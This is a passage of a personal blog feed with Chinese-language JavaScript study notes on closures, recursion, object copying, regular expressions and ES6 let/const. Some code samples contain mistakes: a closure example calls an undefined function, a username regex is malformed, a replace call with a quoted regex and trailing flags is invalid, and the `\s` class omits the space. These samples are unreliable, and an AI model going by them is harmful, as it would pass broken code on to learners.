 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">x, x</span>)&#123;&#125;  <span class="comment">// !!!語法錯誤</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>函數必須聲明在頂層</p>
<ul>
<li>新版的JS會引入「塊級作用域」，為了與新版本接軌，不允許在非函數代碼塊內聲明函數 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;&#125;  <span class="comment">// !!!語法錯誤</span></span><br><span class="line">    <span class="title function_">f</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;&#125;  <span class="comment">// !!!語法錯誤</span></span><br><span class="line">    <span class="title function_">f</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bze</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">eit</span>(<span class="params"></span>)&#123;&#125;    <span class="comment">// 合法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
</ol>
<h2 id="高階函數"><a href="#高階函數" class="headerlink" title="高階函數"></a>高階函數</h2><ul>
<li>由於函數也是一種數據類型，同樣可以作為參數，傳遞給另一個函數使用（例如回調函數）</li>
<li>對其他函數進行操作的函數就稱為<font color="#f54747">高階函數</font><ol>
<li><p>接收函數作為參數</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">callback</span>)&#123;</span><br><span class="line">    callback &amp;&amp; <span class="title function_">callback</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fn</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="title function_">alert</span>(<span class="string">&#x27;Hello&#x27;</span>)&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>將函數作為返回值操作</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fn</span>()</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
<h2 id="閉包Closure"><a href="#閉包Closure" class="headerlink" title="閉包Closure"></a>閉包Closure</h2><ol>
<li><p>變量作用域：</p>
<ul>
<li>函數內部可以使用全局變量</li>
<li>函數外部不可以使用局部變量</li>
<li>當函數執行完畢，本作用域內的局部變量就會銷毀</li>
</ul>
</li>
<li><p>閉包的簡介：</p>
<ul>
<li>指有權訪問另一個函數作用域中變量的<font color="#f54747">函數</font>。</li>
<li>就是一個作用域可以訪問另一個作用域內部的局部變量，閉包就產生  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> num = <span class="number">10</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">fun</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(num)    <span class="comment">// fun函數作用域 訪問了另一個函數fn裡面的局部變量num</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">fun</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fn</span>()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>閉包的作用：</p>
<ul>
<li><font color="#f54747">延長變量的作用範圍</font>，因為後面有別的函數要調用此變量  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> num = <span class="number">10</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(num)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 實現 fn 外部的作用域訪問 fn 內部的局部變量</span></span><br><span class="line"><span class="keyword">var</span> f = <span class="title function_">fun</span>()</span><br><span class="line"><span class="title function_">f</span>()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>閉包的應用：</p>
<ul>
<li><p>案例一、點擊獲取索引號</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 動態添加方式</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; lis.<span class="property">length</span>; i++)&#123;</span><br><span class="line">    lis[i].<span class="property">index</span> = i</span><br><span class="line">    lis[i].<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">index</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 閉包方式</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; lis.<span class="property">length</span>; i++)&#123;</span><br><span class="line">    <span class="comment">// 立即執行函數也稱為一個小閉包，因為立即執行函數裡面任何一個函數都可以使用它的i變量</span></span><br><span class="line">    (<span class="keyword">function</span>(<span class="params">i</span>)&#123;</span><br><span class="line">        lis[i].<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)(i)</span><br></pre></td></tr></table></figure>
</li>
<li><p>案例二、3秒後打印元素內容</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; lis.<span class="property">length</span>; i++)&#123;</span><br><span class="line">    (<span class="keyword">function</span>(<span class="params">i</span>)&#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(lis[i].<span class="property">innerHTML</span>);</span><br><span class="line">        &#125;, <span class="number">3000</span>);</span><br><span class="line">    &#125;)(i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="遞歸Recursion"><a href="#遞歸Recursion" class="headerlink" title="遞歸Recursion"></a>遞歸Recursion</h2><ol>
<li><p>簡介：</p>
<ul>
<li>一個函數在內部可以調用其本身，這個函數就稱為遞歸函數</li>
<li>由於遞歸很容易發生「棧溢出」錯誤(stack overflow)，所以必須要加<font color="#f54747">退出條件return</font></li>
</ul>
</li>
<li><p>遞歸應用：</p>
<ul>
<li><p>應用一、階乘 Factorial</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">factorial</span>(<span class="params">n</span>)&#123;</span><br><span class="line">    <span class="keyword">switch</span>(n)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="attr">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">factorial</span>(n - <span class="number">1</span>) * n</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>應用二、斐波那契數列 Fibonacci</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fibonacci</span>(<span class="params">n</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">1</span> || n == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">fibonacci</span>(n-<span class="number">1</span>) + <span class="title function_">fibonacci</span>(n-<span class="number">2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="對象拷貝"><a href="#對象拷貝" class="headerlink" title="對象拷貝"></a>對象拷貝</h2><ol>
<li><p>淺拷貝 Shallow Copy</p>
<ul>
<li>淺拷貝只是拷貝一層，更深層次對象級別只拷貝地址值</li>
<li>圖示：  <img src="https://p.ipic.vip/v7v66h.png" width="600px"/></li>
<li>ES6實現淺拷貝方法：<ul>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數一、target: 賦予給誰</span></span><br><span class="line"><span class="comment">// 參數二、source: 要拷貝的對象</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(target, source)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><p>深拷貝 Deep Copy</p>
<ul>
<li>深拷貝就是拷貝多層，每一層的數據都會拷貝</li>
<li>圖示：  <img src="https://p.ipic.vip/s72c3s.png" width="600px"/></li>
<li>實現方式：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">deepCopy</span>(<span class="params">newObj, oldObj</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> k <span class="keyword">in</span> oldObj)&#123;</span><br><span class="line">        <span class="keyword">var</span> item = oldObj[k]</span><br><span class="line">        <span class="comment">// 由於Array也屬於Object，因此需要在Object之前篩選出去</span></span><br><span class="line">        <span class="keyword">if</span>(item <span class="keyword">instanceof</span> <span class="title class_">Array</span>)&#123;</span><br><span class="line">            newObj[k] = []</span><br><span class="line">            <span class="title function_">deepCopy</span>(newObj[k], item)</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(item <span class="keyword">instanceof</span> <span class="title class_">Object</span>)&#123;</span><br><span class="line">            newObj[k] = &#123;&#125;</span><br><span class="line">            <span class="title function_">deepCopy</span>(newObj[k], item)</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            newObj[k] = item</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>ES5</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript - Regular Expression</title>
    <url>/myBlog/2022/07/22/2022/2022-7-22-JS-RegularExpression/</url>
    <content><![CDATA[<h2 id="正則表達式的概述"><a href="#正則表達式的概述" class="headerlink" title="正則表達式的概述"></a>正則表達式的概述</h2><ol>
<li><p>簡介：</p>
<ul>
<li>正則表達式 (Regular Expression) 是用於匹配字符串中自字符組合的模式</li>
<li>在JavaScript中，正則表達式是一個對象</li>
</ul>
</li>
<li><p>作用：</p>
<ul>
<li>用於檢索、替換那些符合某個規則的文本<ol>
<li>匹配：<ul>
<li>例如用戶名只能輸入英文字、數字或者下劃線（<font color="#f54747">匹配</font>）</li>
</ul>
</li>
<li>替換：<ul>
<li>過濾掉頁面內容中的一些敏感詞</li>
</ul>
</li>
<li>提取：<ul>
<li>從字符串中獲取想要的特定部分</li>
</ul>
</li>
</ol>
</li>
</ul>
</li>
<li><p>特點：</p>
<ol>
<li>靈活性、邏輯性和功能性非常強</li>
<li>可以迅速地用極簡單的方式達到字符串的複雜控制</li>
<li>對於剛接觸的人而言比較難懂</li>
<li>在實際開發中，一般都是直接複製寫好的正則表達式，但是要求會使用正則表達式，並且根據實際情況修改正則表達式<ul>
<li>比如用戶名：<code>/^[a-z0-9_-](3-16)$</code></li>
</ul>
</li>
</ol>
</li>
</ol>
<h2 id="正則表達式的使用"><a href="#正則表達式的使用" class="headerlink" title="正則表達式的使用"></a>正則表達式的使用</h2><ol>
<li><p>創建正則表達式</p>
<ol>
<li><p>通過調用<code>RegExp</code>對象的構造函數創建</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> 變量名 = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="regexp">/表達式/</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用字面量創建</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> 變量名 = <span class="regexp">/表達式/</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>測試正則表達式</p>
<ul>
<li>用於檢測字符串是否符合該規則</li>
<li>如果符合規則，則返回<code>true</code></li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// regexObj - 正則表達式</span></span><br><span class="line"><span class="comment">// str - 要測試的文本</span></span><br><span class="line">regexObj.<span class="title function_">test</span>(str)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="常用特殊字符"><a href="#常用特殊字符" class="headerlink" title="常用特殊字符"></a>常用特殊字符</h2><h3 id="邊界符"><a href="#邊界符" class="headerlink" title="邊界符"></a>邊界符</h3><ol>
<li><p><code>^</code> - 表示匹配行首的文本（以什麼開始）</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/^abc/      <span class="comment">// 表示必須以 abc 為開頭</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>$</code> - 表示匹配行尾的文本（以什麼結束）</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/abc$/      <span class="comment">// 表示必須以 abc 為結尾</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="字符類"><a href="#字符類" class="headerlink" title="字符類"></a>字符類</h3><ol>
<li><p><code>[]</code> - 表示有一系列字符可供選擇，只要匹配其中一個就可以</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/[abc]/     <span class="comment">// 表示必須包含 a 或 b 或 c 其中一個</span></span><br><span class="line"><span class="regexp">/^[abc]$/</span></span><br></pre></td></tr></table></figure>

</li>
<li><p><code>[-]</code> - 表示內部範圍符</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/[a-z]/     <span class="comment">// 表示必須包含 a-z 的其中一個</span></span><br><span class="line"><span class="regexp">/[a-zA-Z0-9]/</span></span><br></pre></td></tr></table></figure>

</li>
<li><p><code>[^]</code> - 表示取反，<font color="#f54747">千萬與邊界符混淆</font></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/[^a-z]/    <span class="comment">// 表示不能包含 a-z 的其中一個</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="量詞符"><a href="#量詞符" class="headerlink" title="量詞符"></a>量詞符</h3><ol>
<li><p><code>*</code> - 表示重複<font color="skyblue">零次或更多次 (<code>&gt;=0</code>)</font></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/a*<span class="regexp">/    /</span><span class="regexp">/ 表示允許出現零次或以上</span></span><br></pre></td></tr></table></figure>

</li>
<li><p><code>+</code> - 表示重複<font color="skyblue">一次或更多次 (<code>&gt;=1</code>)</font></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/a+<span class="regexp">/    /</span><span class="regexp">/ 表示允許出現一次或以上</span></span><br></pre></td></tr></table></figure>

</li>
<li><p><code>?</code> - 表示重複<font color="skyblue">零次或一次 (<code>0||1</code>)</font></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/a?<span class="regexp">/    /</span><span class="regexp">/ 表示只允許出現零或一次</span></span><br></pre></td></tr></table></figure>

</li>
<li><p><code>&#123;n&#125;</code> - 表示重複<font color="skyblue">n次 (<code>=n</code>)</font></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/a&#123;<span class="number">3</span>&#125;/  <span class="comment">// 表示必須包含三個 a</span></span><br></pre></td></tr></table></figure>

</li>
<li><p><code>&#123;n,&#125;</code> - 表示重複<font color="skyblue">n次或更多次 (<code>&gt;=n</code>)</font></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/a&#123;<span class="number">3</span>,&#125;/  <span class="comment">// 表示必須包含三個以上 a</span></span><br></pre></td></tr></table></figure>

</li>
<li><p><code>&#123;n,m&#125;</code> - 表示重複<font color="skyblue">n到m次 (<code>&gt;=n &amp;&amp; &lt;=m&gt;</code>)</font></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/a&#123;<span class="number">3</span>,<span class="number">6</span>&#125;/  <span class="comment">// 表示必須包含三個到六個 a</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="括號符"><a href="#括號符" class="headerlink" title="括號符"></a>括號符</h3><ol>
<li><p><code>[]</code> - 表示字符合集，匹配方括號中的任意字符</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/[abc]/     <span class="comment">// 表示必須包含 a 或 b 或 c 其中一個</span></span><br></pre></td></tr></table></figure>

</li>
<li><p><code>&#123;&#125;</code> - 表示量詞符，裡面表示重複的次數</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/^abc&#123;<span class="number">3</span>&#125;$/  <span class="comment">// 表示必須重複三次 c</span></span><br></pre></td></tr></table></figure>

</li>
<li><p><code>()</code> - 表示優先級</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/^(abc)&#123;<span class="number">3</span>&#125;$/     <span class="comment">// 表示必須重複三次 abc</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="預定義類"><a href="#預定義類" class="headerlink" title="預定義類"></a>預定義類</h3><ol>
<li><p><code>\d</code> - 表示匹配<font color="skyblue"> 0-9 </font>間的任一數字 (<code>[0-9]</code>)</p>
</li>
<li><p><code>\D</code> - 表示匹配<font color="skyblue"> 0-9 </font><font color="#f54747">以外</font>的字符 (<code>[^0-9]</code>)</p>
</li>
<li><p><code>\w</code> - 表示匹配<font color="skyblue">任意的字母、數字和下劃線</font> (<code>[a-zA-Z0-9_]</code>)</p>
</li>
<li><p><code>\W</code> - 表示匹配<font color="skyblue">除字母、數字和下劃線</font><font color="#f54747">以外</font>的字符 (<code>[^a-zA-Z0-9_]</code>)</p>
</li>
<li><p><code>\s</code> - 表示匹配<font color="skyblue">空格字符（包括換行符、制表符、空格符等）</font> (<code>[\t\r\n\v\f]</code>)</p>
</li>
<li><p><code>\S</code> - 表示匹配<font color="skyblue">非空格字符</font> (<code>[^\t\r\n\v\f]</code>)</p>
</li>
</ol>
<h2 id="字符一覽"><a href="#字符一覽" class="headerlink" title="字符一覽"></a>字符一覽</h2><table>
<thead>
<tr>
<th align="center">特殊字符</th>
<th align="center">說明</th>
<th align="center">例子</th>
</tr>
</thead>
<tbody><tr>
<td align="center">邊界符</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>^</code></td>
<td align="center">表示匹配行首的文本（以什麼開始）</td>
<td align="center"><code>/^abc/</code></td>
</tr>
<tr>
<td align="center"><code>$</code></td>
<td align="center">表示匹配行尾的文本（以什麼結束）</td>
<td align="center"><code>/abc$/</code></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">字符類</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>[ ]</code></td>
<td align="center">表示字符合集，匹配方括號中的任意字符</td>
<td align="center"><code>/[abc]/</code></td>
</tr>
<tr>
<td align="center"><code>[-]</code></td>
<td align="center">表示內部範圍</td>
<td align="center"><code>/[0-9]/</code></td>
</tr>
<tr>
<td align="center"><code>[^]</code></td>
<td align="center">表示取反</td>
<td align="center"><code>/[^0-9]/</code></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">量詞符</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>*</code></td>
<td align="center">允許重複零次或以上</td>
<td align="center"><code>/^a*$/</code></td>
</tr>
<tr>
<td align="center"><code>+</code></td>
<td align="center">允許重複一次或以上</td>
<td align="center"><code>/^a+$/</code></td>
</tr>
<tr>
<td align="center"><code>?</code></td>
<td align="center">允許重複零次或一次</td>
<td align="center"><code>/^a?$/</code></td>
</tr>
<tr>
<td align="center"><code>&#123;n&#125;</code></td>
<td align="center">允許重複n次</td>
<td align="center"><code>/^a&#123;3&#125;$/</code></td>
</tr>
<tr>
<td align="center"><code>&#123;n,&#125;</code></td>
<td align="center">允許重複n次或以上</td>
<td align="center"><code>/^a&#123;3,&#125;$/</code></td>
</tr>
<tr>
<td align="center"><code>&#123;n,m&#125;</code></td>
<td align="center">允許重複n次到m次</td>
<td align="center"><code>/^a&#123;3,6&#125;$/</code></td>
</tr>
<tr>
<td align="center"><code>()</code></td>
<td align="center">表示優先級別</td>
<td align="center"><code>/^(abc)&#123;3&#125;$/</code></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">預定義類</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>\d</code></td>
<td align="center">匹配 0-9 之間任意數字</td>
<td align="center"><code>/\d&#123;3&#125;/</code></td>
</tr>
<tr>
<td align="center"><code>\D</code></td>
<td align="center">匹配 0-9 以外任意數字</td>
<td align="center"><code>/\D&#123;3&#125;/</code></td>
</tr>
<tr>
<td align="center"><code>\w</code></td>
<td align="center">表示匹配任意的字母、數字和下劃線</td>
<td align="center"><code>/\w&#123;3&#125;/</code></td>
</tr>
<tr>
<td align="center"><code>\W</code></td>
<td align="center">表示匹配字母、數字和下劃線以外的字符</td>
<td align="center"><code>/\W&#123;3&#125;/</code></td>
</tr>
<tr>
<td align="center"><code>\s</code></td>
<td align="center">表示匹配空格字符</td>
<td align="center"><code>/\s&#123;3&#125;/</code></td>
</tr>
<tr>
<td align="center"><code>\S</code></td>
<td align="center">表示匹配非空格字符</td>
<td align="center"><code>/\S&#123;3&#125;/</code></td>
</tr>
</tbody></table>
<h2 id="正則替換"><a href="#正則替換" class="headerlink" title="正則替換"></a>正則替換</h2><ol>
<li><p><code>replace</code>方法</p>
<ul>
<li>使用<code>replace()</code>方法可以實現替換字符串操作，用來替換的參數是一個字符串或是一個正則表達式</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數一、regexp: 要替換的正則表達式</span></span><br><span class="line"><span class="comment">// 參數二、replacement: 要替換的內容</span></span><br><span class="line">stringObject.<span class="title function_">replace</span>(regexp/substr, replacement)</span><br></pre></td></tr></table></figure></li>
<li>問題：<ol>
<li>只能替換內容中第一個字符組合</li>
</ol>
</li>
</ul>
</li>
<li><p>正則表達式參數</p>
<ul>
<li><p>正則表達式中也可以傳遞參數</p>
</li>
<li><p>語法：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// switch: 修飾符</span></span><br><span class="line">/regexp/<span class="keyword">switch</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>switch</code>修飾符的三種值：</p>
<ol>
<li><code>g</code> - 全局匹配</li>
<li><code>i</code> - 忽略大小寫</li>
<li><code>gi</code> - 全局匹配和忽略大小寫</li>
</ol>
</li>
<li><p>具體編碼：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">text.<span class="property">value</span>.<span class="title function_">replace</span>(<span class="string">&#x27;/fuck|bitch/&#x27;</span>gi, <span class="string">&#x27;**&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript - ES6</title>
    <url>/myBlog/2022/07/23/2022/2022-7-23-JS-ES6/</url>
    <content><![CDATA[<h2 id="數據聲明"><a href="#數據聲明" class="headerlink" title="數據聲明"></a>數據聲明</h2><h3 id="let關鍵字"><a href="#let關鍵字" class="headerlink" title="let關鍵字"></a>let關鍵字</h3><ol>
<li><p>簡介：</p>
<ul>
<li>ES6 中新增用於聲明變量的關鍵字</li>
</ul>
</li>
<li><p>特性：</p>
<ol>
<li><p>變量不能重複聲明</p>
</li>
<li><p>具有模塊作用域</p>
<ul>
<li><code>let</code>聲明的變量只在所處於的塊級有效</li>
<li>防止循環變量變成全局變量</li>
<li>例子：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> a = <span class="number">10</span></span><br><span class="line">    <span class="keyword">var</span> b = <span class="number">20</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a)      <span class="comment">// err: a is not defined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b)      <span class="comment">// b = 20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)&#123;&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++)&#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(i)      <span class="comment">// err: i is not defined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(j)      <span class="comment">// j = 2</span></span><br></pre></td></tr></table></figure></li>
<li>注意：使用<code>let</code>關鍵字聲明的變量才具有塊級作用域，使用<code>var</code>關鍵字聲明的變量不具備塊級作用域的特性</li>
</ul>
</li>
<li><p>不存在變量提升</p>
<ul>
<li><code>var</code>關鍵字聲明的變量存在變量提升，因此存在先使用後聲明的處境</li>
<li><code>let</code>關鍵字聲明的變量不存在變量提升  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a)      <span class="comment">// a = undefined</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a)      <span class="comment">// err: a is not defined</span></span><br><span class="line"><span class="keyword">let</span> a = <span class="number">20</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>存有暫時性死區特性</p>
<ul>
<li>在塊級區域使用<code>let</code>聲明的變量會被整體綁定在該塊級區域，不受外部代碼影響  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">10</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(num);   <span class="comment">// err: num is not defined</span></span><br><span class="line">    <span class="keyword">let</span> num = <span class="number">20</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    如果塊級中使用了 let 關鍵字聲明重名變量變量</span></span><br><span class="line"><span class="comment">    就會和塊級區域整體進行綁定，在當前區域中的變量與外部是沒有關係</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
</ol>
<h3 id="const關鍵字"><a href="#const關鍵字" class="headerlink" title="const關鍵字"></a>const關鍵字</h3><ol>
<li><p>簡介：</p>
<ul>
<li>ES6 新增用於聲明常量的關鍵字</li>
<li>常量就是值<font color="#f54747">（內存地址）</font>不能變化的量</li>
</ul>
</li>
<li><p>特性：</p>
<ol>
<li><p>聲明常量時必須賦值</p>
</li>
<li><p>具有模塊作用域</p>
<ul>
<li><code>const</code>聲明的變量只在所處於的塊級有效  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> a = <span class="number">10</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a)      <span class="comment">// err: a is not defined</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>常量賦值後值不能修改</p>
<ul>
<li>基本數據類型中，常量的值不可更改  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">PI</span> = <span class="number">3.14</span></span><br><span class="line"><span class="variable constant_">PI</span> = <span class="number">100</span>    <span class="comment">// Assignment to constant variable</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>數組與對象的元素修改，不算做對常量的修改</p>
<ul>
<li>複雜數據類型中，數據結構內部的值可更改，但常量的地址不可更改  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">100</span>, <span class="number">200</span>]</span><br><span class="line">arr[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">arr[<span class="number">1</span>] = <span class="string">&#x27;b&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr)    <span class="comment">// [&#x27;a&#x27;,&#x27;b&#x27;]</span></span><br><span class="line">arr = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>]    <span class="comment">// Assignment to constant variable</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
</ol>
